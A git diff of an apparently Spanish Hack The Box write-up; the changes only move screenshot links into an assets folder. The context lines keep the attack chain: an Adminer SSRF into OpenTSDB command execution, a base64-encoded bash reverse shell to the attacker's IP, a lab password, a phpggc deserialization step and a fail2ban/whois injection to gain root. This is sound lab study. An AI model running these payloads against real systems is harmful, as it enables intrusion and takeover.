@@ -1,7 +1,7 @@
-![](2022-06-21-10-50-28.png)
+![](assets/2022-06-21-10-50-28.png)
 
 
-![](2022-06-21-10-50-47.png)
+![](assets/2022-06-21-10-50-47.png)
 
 
 
@@ -22,7 +22,7 @@ Hemos seguido con fuzzing, en el normal no hemos conseguido nada interestante, h
 ## dominio encontrado
 Hemos visitado página por página incluso alguna 404 una vez que te pones encima del enlace aparece abajo que hay un dominio admirer-gallery.htb
 
-![](2022-06-08-12-36-16.png)
+![](assets/2022-06-08-12-36-16.png)
 
 Añadimos a /etc/hosts 
 ```bash
@@ -39,11 +39,11 @@ Ahora que tenemos el dominio podemos usar gobuster para subdominios. Recordamos 
 gobuster vhost -u http://admirer-gallery.htb -w /home/riskoo/Riskoo/paginas/diccionarios/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 200
 ```
 
-![](2022-06-08-12-35-59.png)
+![](assets/2022-06-08-12-35-59.png)
 
 Añadimos tambien a /etc/hosts db.admirer-gallery.htb que hemos encontrado
 
-![](2022-06-08-12-42-11.png)
+![](assets/2022-06-08-12-42-11.png)
 
 ## Abrimos burpsuite y controlamos ese login
 
@@ -62,16 +62,16 @@ Viendo los privilegios aparte de nuestro usuario conseguimos un hash, lo guardam
 ```sql
 show grants;
 ```
-![](2022-06-12-09-59-49.png)
+![](assets/2022-06-12-09-59-49.png)
 
 -Vemos que la versión Admirer aparece como si no estuviese actualizado, así que buscamos información.
-![](2022-06-12-10-02-21.png)
-![](2022-06-12-10-03-30.png)
+![](assets/2022-06-12-10-02-21.png)
+![](assets/2022-06-12-10-03-30.png)
 
 -   Encontramos que Adminer 4.7.8 es vulnerable a SSRF
 
 
-![](2022-06-12-10-06-04.png)
+![](assets/2022-06-12-10-06-04.png)
 
 ```bash
 Sinopsis
@@ -84,7 +84,7 @@ Seguimos indagando por si el creador de adminer vnran u otro hablan del tema. Co
 
 > Existe una víá potencial, podemos hacer pruebas para que el servidor nos liste contenido privilegiado
 
-![](2022-06-12-10-11-40.png)
+![](assets/2022-06-12-10-11-40.png)
 
 Aunque lo anterior no lo podemos ver directamente nosotros, podemos observar que hay 5 campos, donde el primero es elastic, si pasamos la petición de logueo por burpsuite podemos ver la petición y como lo hace.
 
@@ -102,7 +102,7 @@ Aparte nos ponemos en escucha con netcat en el puerto 80
 nc -nlvp 80
 ```
 
-![](2022-06-12-11-03-03.png)
+![](assets/2022-06-12-11-03-03.png)
 
 Vemos que se ejecuta una petción y la ida es que esta peticion podemos redirigirla a otro lado SSRF
 
@@ -125,7 +125,7 @@ python2 redirect.py -p 80 http://10.10.14.48:8686/prueba
 
 Nos aparece este error porque no hemos capturado con burpsuite y poniendo el hack de elastic y nuestra ip
 
-![](2022-06-12-11-16-03.png)
+![](assets/2022-06-12-11-16-03.png)
 
 - 1º puerto escucha en python
 - 2º interceptamos el loguin y cambiamos elastic y nuestra ip 10.10.14. 
@@ -133,7 +133,7 @@ Nos aparece este error porque no hemos capturado con burpsuite y poniendo el hac
 - 3º lanzamos el script en python redirect.py como pone arriba
 - 4º le damos en burpsuite a forward y quitamos la intercepción y deberíá de aparecer lo siguiente
 
-![](2022-06-12-11-20-09.png)
+![](assets/2022-06-12-11-20-09.png)
 
 ## Hacer la misma redirección pero a su propia máquina
 
@@ -150,7 +150,7 @@ Algo que podemos hacer llegado este punto es hacer un nuevo escaneo de puertos p
 ```bash
 sudo nmap -p- -sS --min-rate 5000 -vvv -n -Pn 10.10.11.137 
 ```
-![](2022-06-12-11-30-02.png)
+![](assets/2022-06-12-11-30-02.png)
 
 Podemos observar que hay puertos filtrados por el firewall como el 4242.
 
@@ -162,7 +162,7 @@ La idea es ver si haciendo la misma prueba que antes con el puerto 80 cambiando 
 
 Vemos que ahora nos está leyendo
 
-![](2022-06-12-11-36-13.png)
+![](assets/2022-06-12-11-36-13.png)
 
 De aquí podemos ver algunas cosas ya que es lo que nos devuelve el puerto 4242. Está lanzando un servicio **OpenTSDB**.
 
@@ -172,7 +172,7 @@ Buscamos **OpenTSDB exploits** en google . Aunque no hemos podido ver que versi�
 
 Podemos ver que existe un [Remote Code Execution Issue #2051](https://github.com/OpenTSDB/opentsdb/issues/2051)
 
-![](2022-06-12-11-45-59.png)
+![](assets/2022-06-12-11-45-59.png)
 
 Disponemos de un PoC
 
@@ -210,7 +210,7 @@ No olvidar todos los pasos ...
 python2 redirect.py -p 80 "http://localhost:4242/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[33:system('ping+-c+1+10.10.14.48')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json"
 ```
 
-![](2022-06-12-11-55-21.png)
+![](assets/2022-06-12-11-55-21.png)
 
 Vemos que está leyendo aunque parece un fallo, leyendo el último error... aparece **net.opentsdb.uid.nosuchuniquename** no such name for 'metrics':sys.cpu.nice ...
 
@@ -218,7 +218,7 @@ En nuestro servidor parece que esa métrica no existe, por lo que intentaríámo
 
 Buscamos en google opentsdb list metrics stackoverflow 
 
-![](2022-06-12-11-59-54.png)
+![](assets/2022-06-12-11-59-54.png)
 
 Por ejemplo podemos ver que con api suggest podemos listar algunas cosas.
 
@@ -232,7 +232,7 @@ Vamos a ver si aparece con la metrica que hemos visto en stackoverflow
 python2 redirect.py -p 80 "http://localhost:4242/api/suggest?type=metrics&q=sys&max=10" 
 ```
 
-![](2022-06-12-12-05-50.png)
+![](assets/2022-06-12-12-05-50.png)
 
 No está devolviendo nada, pero eso puede ser que estemos filtrando demasiado así que le vamos a quitar el q=sys de los parámetros y vamos a ver. Además aumentaremos el número de resultados para ver un listado mayor. Este tipo de cosas es posible que no funcionen en otros casos, según los parámetro podríamos jugar.
 
@@ -242,7 +242,7 @@ A tener en cuenta que según lo que vimos en la imagen de starckoverflow, esta c
 python2 redirect.py -p 80 "http://localhost:4242/api/suggest?type=metrics&q=&max=10" 
 ```
 
-![](2022-06-12-12-13-33.png)
+![](assets/2022-06-12-12-13-33.png)
 
 Una vez que hemos descubierto un tipo de métrica en su interior, podemos cambiar el **sys.cpu.nice** que nos dió fallo al principio por **http.stats.web.hits**
 
@@ -250,11 +250,11 @@ Una vez que hemos descubierto un tipo de métrica en su interior, podemos cambia
 python2 redirect.py -p 80 "http://localhost:4242/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:http.stats.web.hits&o=&ylabel=&xrange=10:10&yrange=[33:system('ping+-c+1+10.10.14.48')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json"
 ```
 
-![](2022-06-12-12-16-35.png)
+![](assets/2022-06-12-12-16-35.png)
 
 Conseguimos que nos devuelva el ping. Lo tenemos que ver desde tcpdump
 
-![](2022-06-12-12-28-14.png)
+![](assets/2022-06-12-12-28-14.png)
 
 
 
@@ -282,7 +282,7 @@ echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40OC80NDMgMD4mMScK | base
 # Si además decimos que lo ejecute como bash
 echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40OC80NDMgMD4mMScK | base64 -d | bash
 ```
-![](2022-06-12-18-28-48.png)
+![](assets/2022-06-12-18-28-48.png)
 
 Como vemos por el puerto de escucha aparece una bash 
 
@@ -307,7 +307,7 @@ python2 redirect.py -p 80 "http://localhost:4242/q?start=2000/10/21-00:00:00&end
 
 Recordar que hay que volver a hacer los paso...
 
-![](2022-06-12-18-43-47.png)
+![](assets/2022-06-12-18-43-47.png)
 
 Ya tenemos una consola operativa
 
@@ -470,12 +470,12 @@ ssh     31762 riskoo    5u  IPv4 117740      0t0  TCP localhost:7878 (LISTEN)
 
 Una vez hecho el local port forwarding podemos entrar en el puerto 8080 si miramos 127.0.0.1:7878
 
-![](2022-06-13-09-46-15.png)
+![](assets/2022-06-13-09-46-15.png)
 
 Probamos las diferentes credenciales típicas admin:admin ... 
 Tenemos las credenciales jennifer: bQ3u7^AxzcB7qAsxE3
 
-![](2022-06-13-09-50-30.png)
+![](assets/2022-06-13-09-50-30.png)
 
 
 Buscamos en google información opencats exploit. Abajo de la web hemos localizado la versión 0.9.5.2 por eso es importante analizar la web y ver de donde puedes sacar información
@@ -560,27 +560,27 @@ Vamos a usar el phpgcc para meter un payload serializado en la url. Por lo que n
 # Ya viene compilado
 git clone https://github.com/ambionics/phpggc
 ```
-![](2022-06-21-09-45-38.png)
+![](assets/2022-06-21-09-45-38.png)
 
 
 
 Miramos los procesos y observamos que de omment solo tenemos acceso a los procesos de jennifer
 
-![](2022-06-21-10-09-29.png)
+![](assets/2022-06-21-10-09-29.png)
 
 El motivo es porque proc tiene la flag idepid=2 que hace que solo puedan ver los procesos del mismo usuario
 
-![](2022-06-21-10-10-28.png)
+![](assets/2022-06-21-10-10-28.png)
 
 Seguimos investigando y por ejemplo en la zona de los log /var/log podemos ver alguna que otra aplicación. En este caso podemos observar que tiene fail2ban, aquí vamos a tiro hecho porque la máquina nos decía que íbamos a probar esto.
 
-![](2022-06-21-10-12-25.png)
+![](assets/2022-06-21-10-12-25.png)
 
 
 Fail2ban lo que hace es que después de x intentos te bloquea. 
 Hemos buscado en google **fail2ban exploit** y encontramos que cuando te bloquean se ejecuta como root un comando
 
-![](2022-06-21-10-14-21.png)
+![](assets/2022-06-21-10-14-21.png)
 
 Este comando nos cometan que escapando ~! pdoemos inyectar nuestro código , necesitariamos ir viendo cosas como donde está el arhivo de configuración de whois
 
@@ -594,35 +594,35 @@ strace whois 127.0.0.1
 
 Observamos el código para ver si encontramos por ejemplo en este caso el archivo de configuración y vemos que se encuentra alojado en la ruta /usrc/local/etc la cual vimos antes que podíamos escribir
 
-![](2022-06-21-10-22-14.png)
+![](assets/2022-06-21-10-22-14.png)
 
 Por lo que intentaremos sobreescribir el whois o crearlo a través del phpgcc 
 >importante es que tendría que seguir el formato suyo porque si no lo hacemos sale lo siguiente:
 
-![](2022-06-21-10-24-55.png)
+![](assets/2022-06-21-10-24-55.png)
 
 Buscamos en el whois de github el whois.c para ver la configuración y encontramos como busca la concordancia
-![](2022-06-21-10-29-42.png)
+![](assets/2022-06-21-10-29-42.png)
 
 Al ver que hay 512 de buffer y que queremos que no lea cierta parte del código que hemos "copiado su extructura" de whois, pues lo quehacemos es meterle una serie de espacions. Como hacemos esto?, por ejemplo:
 
 ```pthon3
 python3 -c 'print("]*10.10.14.29 10.10.14.29" + " "*500)'
 ```
-![](2022-06-21-10-33-37.png)
+![](assets/2022-06-21-10-33-37.png)
 
 Lo guardamos en whois.conf y ejecutamos el phpggc
 
-![](2022-06-21-10-35-12.png)
+![](assets/2022-06-21-10-35-12.png)
 
 Metemos la data después de DataGrid=
-![](2022-06-21-10-36-45.png)
+![](assets/2022-06-21-10-36-45.png)
 
 
 
 y ahora en el archivo que se ha creado, vemos que tiene
 
-![](2022-06-21-10-35-57.png)
+![](assets/2022-06-21-10-35-57.png)
 
 
 Ahora nos ponemos en escucha por el puerto 43 que es por donde opea el whois
@@ -632,13 +632,13 @@ nc -nlvp 43
 
 Si ahora funciona lo que hemos hecho si hacemos un whois a nuestra ip 10.10.14.29 deberíamos de recibir una petición
 
-![](2022-06-21-10-39-03.png)
+![](assets/2022-06-21-10-39-03.png)
 
 Como hemos recibido la petición ahora si podemos meterle un input. ¿Cómo lo hacemos?
 Según vimos metiendo en un archivito ~! , podemos meter luego un código que será ejecutado por root.
 Realmente podemos hacer muchas cosas pero en este caso en vez de una revert shell lo que vamos a hacer es dar privilegios u+s a bin bash.
 Para ejecutar esto tendría que banearnos.
-![](2022-06-21-10-42-48.png)
+![](assets/2022-06-21-10-42-48.png)
 
 Haremos para banearnos intentos de ssh varias veces hasta que nos banee
 
@@ -648,15 +648,15 @@ Nos ponemos en escucha por el puerto 43 como antes pero le pasamos el arhivo pwn
 nc -nlvp 43 < pwned
 ```
 
-![](2022-06-21-10-44-38.png)
+![](assets/2022-06-21-10-44-38.png)
 
 
 Después de varios intentos de entrar por ssh cualquiera a la máquina, parece que recibimos una petición. En esta supuestamente le hemos inyectado el pwned y fail2ban ha cogido y ejecutado whois que en este caso tiene el chmod para darnos permisos.
 
 En principio debemos de estar baneados, nos conectamos por ssh como jennifer
 
-![](2022-06-21-10-49-25.png)
+![](assets/2022-06-21-10-49-25.png)
 
 Vemos que ya somos root
 
-![](2022-06-21-10-49-53.png)
+![](assets/2022-06-21-10-49-53.png)
